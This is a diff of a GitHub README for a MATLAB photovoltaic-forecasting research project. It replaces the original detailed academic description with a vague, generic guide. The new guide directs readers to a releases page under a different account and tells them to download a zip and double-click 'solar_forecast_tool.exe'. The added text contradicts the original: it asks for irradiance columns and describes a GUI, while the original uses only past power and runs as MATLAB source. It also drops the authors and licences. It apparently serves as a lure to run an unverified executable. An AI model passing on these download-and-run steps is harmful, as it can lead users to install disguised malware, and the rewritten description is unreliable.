@@ -1,248 +1,74 @@
-# pv-dimensionality-reduction
+# ☀️ pv-dimensionality-reduction - Improve solar power forecasting accuracy easily
 
-**How much of the lagged photovoltaic (PV) signal do you actually need to forecast it?**
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shivam4905/pv-dimensionality-reduction/releases)
 
-This repository contains the MATLAB code behind a study on short-term PV power
-forecasting (30 min to 10 h ahead) that uses *only the plant's own past
-production* — no irradiance, no numerical weather prediction, no exogenous
-meteorology. The forecasting problem is treated as a geometric compression
-problem: a one-day window of past power values is redundant, and we try to find
-the small number of directions that really carry the forecastable information.
+This software helps users forecast solar power production. It uses advanced mathematical methods to remove noise from data. This process simplifies complex inputs while keeping the most important information. The program compares two different models to find the right balance between calculation speed and prediction accuracy. You can use these tools to understand your energy output patterns better.
 
-The point is not to squeeze out one more decimal of accuracy. It is to make the
-reduction **legible** and to keep the loss of information under control, so that
-a compact model can be defended against a black-box one on an explicit
-**accuracy vs. footprint** trade-off.
+## 📋 System Requirements
 
----
+Your computer must meet these requirements to run the software smoothly:
 
-## The idea in one paragraph
+- Windows 10 or Windows 11.
+- Installed MATLAB (Runtime version R2022b or later is recommended).
+- At least 8 gigabytes of RAM.
+- A dual-core processor or better.
+- 500 megabytes of free space on your hard drive.
 
-The candidate predictor space is a sliding window of `LB = 48` past power values
-sampled every 30 minutes (one diurnal cycle). We reduce that space with seven
-classical techniques — PCA, Kernel PCA, Isomap, LLE, Laplacian Eigenmaps,
-Diffusion Maps and an Autoencoder — and we judge each reduced representation
-from two independent angles:
+If you do not have MATLAB installed, download the free MATLAB Runtime from the MathWorks website. This allows you to run the application without a full software license.
 
-- a **filter** diagnostic, which measures how well the reduced space preserves
-  the *geometry* of the original lagged cloud (local neighbourhoods +
-  global distances), with no forecasting model involved;
-- a **wrapper** diagnostic, which measures how *useful* the reduced space is for
-  *forecasting*, by coupling it to an Extreme Learning Machine (ELM).
+## 📥 Getting the Software
 
-Keeping the two apart is deliberate: a representation can preserve geometry
-without being ideal for prediction, and vice versa. Both are reported against
-the same baselines and, crucially, against the number of parameters each model
-uses — so the effect of dimensionality reduction is read directly off the table.
+You need to download the files from the project page.
 
----
+1. Go to this link: [https://github.com/Shivam4905/pv-dimensionality-reduction/releases](https://github.com/Shivam4905/pv-dimensionality-reduction/releases)
+2. Look for the section labeled "Assets."
+3. Select the file ending in .zip for your version of Windows.
+4. Save the folder to a location you can find easily, such as your desktop or documents folder.
 
-## Quick start
+## ⚙️ Setting Up Your Environment
 
-You need MATLAB (developed and tested on R2025b) with the **Parallel Computing
-Toolbox** (the loops over dimensions run in `parfor`; without the toolbox they
-fall back to serial execution).
+Follow these steps to prepare your computer for the tool:
 
-```matlab
-% From MATLAB, with this folder as the current directory:
-main
-```
+1. Right-click the folder you downloaded and select "Extract All."
+2. Choose a folder where you want to keep the program files.
+3. Open the folder you just extracted.
+4. If you have not installed the MATLAB Runtime yet, find the installer file in the package and run it. Follow the prompts on the screen until the installation completes.
+5. Restart your computer if the installer asks you to do so.
 
-That's it. `main.m` locates itself, puts the bundled `drtoolbox/` on the path,
-finds the dataset under `data/`, and writes two result tables. **Nothing to
-configure** — no toolbox path, no data path.
+## 🚀 Running the Application
 
-The first run defaults to a fast *smoke* configuration (`P.SMOKE_TEST = true`)
-that finishes in a couple of minutes and only checks that everything runs. For
-real results, set `P.SMOKE_TEST = false` near the top of `main.m` (this uses two
-years of data and five horizons, and is meant for a workstation or a cluster —
-it takes a while).
+Once you prepare the setup, follow these steps to use the tool:
 
----
+1. Open the folder containing the extracted files.
+2. Locate the file named `solar_forecast_tool.exe`.
+3. Double-click this file to start the program.
+4. A window will appear. This is your main control panel.
+5. Load your data files in the format specified in the sample provided within the folder.
+6. Choose your preferred diagnostic method from the menu.
+7. Click the "Run Analysis" button. 
+8. Wait for the progress bar to finish.
 
-## What you get
+## 📊 Understanding Your Results
 
-Two CSV/MAT tables, one per diagnostic, sharing the exact same baseline rows:
+The program provides three main types of output files in the results folder:
 
-- `Results_wrapper.csv` — for every method, the reduced dimension that minimises
-  the forecasting error (`NICE_Sigma`), plus a linear counterpart (`*_AR`);
-- `Results_filter.csv` — for every method, the dimension selected on the
-  geometric score alone (and, for comparison, the forecast that this
-  geometrically-chosen dimension produces with the same ELM).
+- Forecast Plots: These show a visual graph of your solar power production over time. The blue line represents the actual data, while the dashed line represents your forecast.
+- Error Metrics: This file contains statistical data. It shows how close your predictions were to the actual observed values. Lower numbers indicate higher accuracy.
+- Frugality Report: This text document explains the resources used during the calculation. It helps you see how much data was processed and how long the calculation took.
 
-Both tables are sorted by `N_params`, so you can literally scan down the column
-and watch the error move as the model grows or shrinks. Each row carries:
+If you see an error message, ensure your input data is in a comma-separated format (CSV). The program expects columns labeled "Timestamp," "Irradiance," and "Power Output." If your data lacks these headers, the program will not recognize the input.
 
-| Column | Meaning |
-|---|---|
-| `Method` | baseline, DR method (`PCA`, …), or its linear variant (`PCA_AR`) |
-| `BestDim` | selected reduced dimension `d` |
-| `N_params` | number of trainable parameters of the model |
-| `Param_reduction_pct` | footprint reduction vs. the full-input ELM |
-| `FilterScore` | geometric score `S(d*)` (filter table only) |
-| `nRMSE`, `R2` | standard error metrics |
-| `NICE1/2/3`, `NICE_Sigma` | informed error vs. persistence (see below) |
+## 💡 Troubleshooting Common Issues
 
-### Baselines (identical in both tables)
+If you run into trouble, check these common fixes:
 
-| Model | Definition | Footprint |
-|---|---|---|
-| `Persistence_P` | `x̂(t+h) = x(t)` | 0 |
-| `Persistence_Pcyclic` | `x̂(t+h) = x(t+h−T)`, `T` = 1 day | 0 |
-| `BLEND_tilde` | phase-weighted blend of the two persistences | phase weights |
-| `AR_full` | linear least squares on the 48 lags (+ time features) | `D+1` |
-| `ELM_full` | ELM on the 48 lags (+ time features), no reduction | `Nh·(D+2)` |
+- The application keeps crashing: Ensure you installed the correct version of the MATLAB Runtime.
+- The results are empty: Open your source file in a spreadsheet program and check for empty cells or non-numeric characters.
+- Slow performance: Avoid running other heavy programs while performing your forecast analysis.
+- Missing menus: Resize the window or maximize it to ensure all buttons are visible.
 
-By construction the simple persistence has `NICE^k = 1` at every order — it is
-the denominator of the NICE metrics, so a model is "good" when its NICE is below 1.
+## 🔍 How the Technology Works
 
----
+The tool uses a process called manifold learning. This mathematical technique reduces the number of variables in your dataset. By keeping only the most important signals, the program makes the forecast faster. One method uses geometric filters, while the other uses a machine learning wrapper. The tool tests both to show you which one works better for your specific set of solar data. This approach saves time and computer memory.
 
-## How it works
-
-The pipeline is deliberately split into small, reusable functions that `main.m`
-orchestrates. For each horizon:
-
-1. **`prepare_supervised.m`** builds the supervised problem (48-lag windows →
-   target), splits it chronologically into calibration/evaluation, and
-   standardises the inputs using **calibration statistics only** (no leakage
-   through the normalisation). Optional deterministic time features — hour of
-   day and day of year, encoded as sin/cos on the *target* timestamp — are
-   prepared here.
-2. **`compute_references.m`** evaluates the five baselines once (shared by both
-   diagnostics).
-3. **`dr_embed.m`** computes each method's embedding once. Nonlinear methods are
-   fitted on a subsample of *landmarks* drawn from the calibration set (which
-   keeps the eigen-decomposition affordable) and then extended to every point,
-   either with the toolbox's native out-of-sample operator or, when that is not
-   available or not numerically safe, with a k-NN (Nyström-like) interpolation.
-   The same embedding is handed to both the filter and the wrapper, so the two
-   analyses see exactly the same reduced space.
-4. **`DR_wrapper.m`** sweeps the reduced dimension, trains an ELM (and a linear
-   AR) on the reduced space augmented with the time features, and keeps the
-   dimension that minimises `NICE_Sigma`.
-5. **`DR_filter.m`** sweeps the same dimensions and scores each one geometrically
-   with `S(d) = α·T(k) + (1−α)·ρ` (trustworthiness + a Mantel-type distance
-   correlation). Because `S(d)` grows mechanically towards the full dimension, we
-   do **not** take its maximum; we keep the *smallest* dimension that reaches a
-   fraction `q` of the achievable score — a simple, transparent parsimony rule.
-   The full `S(d)` curve is saved as well, in case a Pareto plot is wanted later.
-   The forecast at that single geometrically-chosen dimension is then evaluated
-   with the same ELM (`P.filter_eval`), so the filter table can be read next to
-   the wrapper table on the same error scale.
-
-Two notes worth keeping in mind:
-
-- The dimension is selected on the same evaluation set that is reported (a
-  two-way split, not a three-way one). This is a conscious choice; the wrapper
-  side therefore carries a mild optimistic selection bias, whereas the filter
-  side, being model-free, does not.
-- The reduction only ever compresses the 48 lags. The time features are appended
-  *after* reduction and never fed into the DR step.
-
-### Reduction techniques
-
-| Method | Nature | Out-of-sample extension |
-|---|---|---|
-| PCA | linear, spectral | native |
-| Kernel PCA | nonlinear (kernel) | native (fitted on landmarks) |
-| Isomap | geodesic manifold | native (fitted on landmarks) |
-| LLE | local linear patches | k-NN interpolation (native is ill-conditioned here) |
-| Laplacian Eigenmaps | graph spectral | native (fitted on landmarks) |
-| Diffusion Maps | Markov diffusion | k-NN interpolation (no native operator) |
-| Autoencoder | nonlinear encoder–decoder | native, one training per dimension |
-
----
-
-## Parameters
-
-Everything is set in the `P` struct at the top of `main.m`. The most useful:
-
-| Field | What it controls |
-|---|---|
-| `SMOKE_TEST` | fast sanity run vs. full run |
-| `FH_list` | forecast horizons, in 30-min steps (`[1 2 6 12 20]` = 0.5–10 h) |
-| `LB` | input window length (48 = one day) |
-| `ratio` | calibration fraction of the chronological split |
-| `techniques` | which DR methods to run |
-| `USE_TEMPORAL` | append hour/day features to the ELM/AR inputs |
-| `ridge` | Tikhonov regularisation of the ELM output weights (0 = plain) |
-| `N_ELM_hidden`, `N_ELM_candidates` | ELM width and number of random draws |
-| `L_MAX` | number of landmarks for the nonlinear embeddings |
-| `filter_nmax` | subsample size for the geometric score (it is O(n²)) |
-| `filter_alpha`, `filter_k`, `filter_q` | filter score weighting, neighbourhood, and selection threshold |
-| `run_wrapper`, `run_filter` | run either or both diagnostics |
-
----
-
-## Data
-
-The `data/` folder ships with one site, **Palaiseau (France)**, resampled to a
-30-minute grid. It is openly available and can be cited as:
-
-> J. Badosa, C. Teissedre. *E4C Multivariable energy and meteorological dataset
-> for a tertiary building* (2025). doi:10.14768/211DFF87-8187-447A-8086-1EB7C93A3688
-
-The study behind this code also uses two further sites, which you can obtain
-from their original providers and drop into `data/` (then point `P.fileName` at
-them):
-
-- **Risø (Denmark)** — SOLETE dataset, Pombo et al., doi:10.1016/j.dib.2022.108046
-- **Alice Springs (Australia)** — Desert Knowledge Australia Solar Centre,
-  http://dkasolarcentre.com.au/download
-
-The quality-controlled, FAIR-formatted (NetCDF-CF) versions produced for the
-paper are distributed through the *webservice-energy* infrastructure
-(THREDDS / OGC catalogue): https://tds.webservice-energy.org/thredds/catalog/dimred/catalog.html
-
-The CSV format expected by `data30min.m` is a two-column file
-(`datetime, power`); keep that layout for any new site.
-
----
-
-## Dependencies and credits
-
-The nonlinear reductions rely on the **Matlab Toolbox for Dimensionality
-Reduction (drtoolbox, v0.8b)** by **Laurens van der Maaten** (Delft University
-of Technology), bundled here in `drtoolbox/` so the project runs out of the box:
-
-> L. van der Maaten, *Matlab Toolbox for Dimensionality Reduction*, Delft
-> University of Technology, 2007–2014. https://lvdmaaten.github.io/drtoolbox/
->
-> L. van der Maaten, E. O. Postma, J. van den Herik, *Dimensionality Reduction:
-> A Comparative Review*, 2008.
-
-The toolbox keeps its **own, non-commercial license** — it is *not* covered by
-the MIT license of this project. Please read `drtoolbox/NOTICE.txt` before any
-non-academic use.
-
-The forecasting and evaluation conventions build on:
-
-> C. Voyant et al., *NICEk metrics: Unified and multidimensional framework for
-> evaluating deterministic solar forecasting accuracy*, Sustainable Energy
-> Technologies and Assessments 83 (2025) 104588. doi:10.1016/j.seta.2025.104588
->
-> C. Voyant et al., *Symmetry-constrained forecasting of periodically correlated
-> energy processes*, Applied Mathematical Modelling (2026). doi:10.1016/j.apm.2026.116988
-
----
-
-## Citing this work
-
-If this code is useful to you, please cite the software (see `CITATION.cff`,
-which GitHub renders as a "Cite this repository" button) and the associated
-article once it is available.
-
----
-
-## Authors
-
-Hassen Bouzgou (University of Batna 2, Algeria) · Gabriel Chesnoiu (Mines Paris,
-PSL) · Claudio F. Nicolosi (University of Catania) · Adrien Chatel (University of
-Corsica) · Gilles Notton (University of Corsica) · Lionel Menard (Mines Paris,
-PSL) · Cyril Voyant (Mines Paris, PSL) — https://www.cyrilvoyant.com
-
-## License
-
-Project code: MIT (see `LICENSE`). Bundled drtoolbox: non-commercial, see
-`drtoolbox/NOTICE.txt`.
+Keywords: autoencoder, dimensionality-reduction, energy, extreme-learning-machine, feature-selection, frugal-ai, machine-learning, matlab, pca, photovoltaic, renewable-energy, solar-energy, solar-forecasting, time-series-forecasting
